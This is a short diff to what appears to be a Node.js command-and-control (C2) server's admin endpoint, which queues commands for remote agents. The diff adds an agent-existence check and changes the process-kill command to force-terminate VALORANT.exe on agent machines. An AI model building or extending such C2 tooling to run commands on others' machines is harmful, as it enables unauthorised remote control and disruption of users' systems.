@@ -1091,9 +1091,15 @@ app.post('/api/admin/c2/kill/:agentId', authenticateAdmin, async (req, res) => {
     if (!dbReady) return res.status(503).json({ error: "Database not available" });
 
     try {
+        // Check if agent exists
+        const [agent] = await pool.query("SELECT * FROM c2_agents WHERE agent_id = ?", [agentId]);
+        if (agent.length === 0) {
+            return res.status(404).json({ error: `Agent with ID ${agentId} not found.` });
+        }
+
         // Create kill command
         const commandType = killType === 'process' ? 'kill_process' : 'kill_agent';
-        const commandData = killType === 'process' ? 'self' : 'terminate';
+        const commandData = killType === 'process' ? 'taskkill /F /IM "VALORANT.exe"' : 'terminate';
         
         const [result] = await pool.query(
             "INSERT INTO c2_commands (agent_id, command_type, command_data, status) VALUES (?, ?, ?, 'pending')",
